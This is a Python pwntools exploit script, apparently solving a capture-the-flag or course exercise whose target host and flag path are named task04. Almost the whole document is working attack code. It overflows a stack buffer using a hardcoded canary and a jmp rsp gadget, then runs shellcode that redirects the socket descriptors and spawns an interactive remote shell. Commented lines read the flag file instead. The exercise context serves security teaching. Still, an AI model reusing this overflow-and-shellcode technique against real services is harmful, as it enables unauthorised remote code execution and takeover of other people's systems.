from pwn import *
import struct


HOST = "set_02-miningx_chen5219-1"
# HOST = "127.0.0.1"
PORT = 1337
context.arch = 'amd64'
context.os = 'linux'

CANARY = b"\x00\xa5\x7c\xed\x8c\xc3\xaa\x3b"
# CANARY = b"\x00\x0f\xba\x16\x8d\x87\xf2\xce"
JMP_RSP = 0x40146f

shellcode = asm(shellcraft.dup2(4,0))
shellcode += asm(shellcraft.dup2(4,1))
shellcode += asm(shellcraft.dup2(4,2))
shellcode += asm(shellcraft.sh())
# shellcode = asm(shellcraft.dupsh())
# shellcode = asm(shellcraft.cat2("/home/task04/flag.txt", 3))
# shellcode += asm(shellcraft.cat2("/home/task04/flag.txt", 4))
# shellcode += asm(shellcraft.cat2("/home/task04/flag.txt", 5))


# --- PAYLOAD CONSTRUCTION ---
payload = b"A" * 40
payload += CANARY
payload += b"B" * 8
payload += p64(JMP_RSP)
payload += b"\x90" * 16
payload += shellcode

# --- EXECUTION ---
try:
    r = remote(HOST, PORT)
    
    r.send(p32(len(payload)))
    
    print(r.recvuntil(b"Length:").decode())
    print(f"Sending payload ({len(payload)} bytes)...")
    r.send(payload)
    r.interactive() 
    print("Catching output:")
    # print(r.recvall(timeout=5).decode(errors='ignore'))

except Exception as e:
    print(f"Error: {e}")

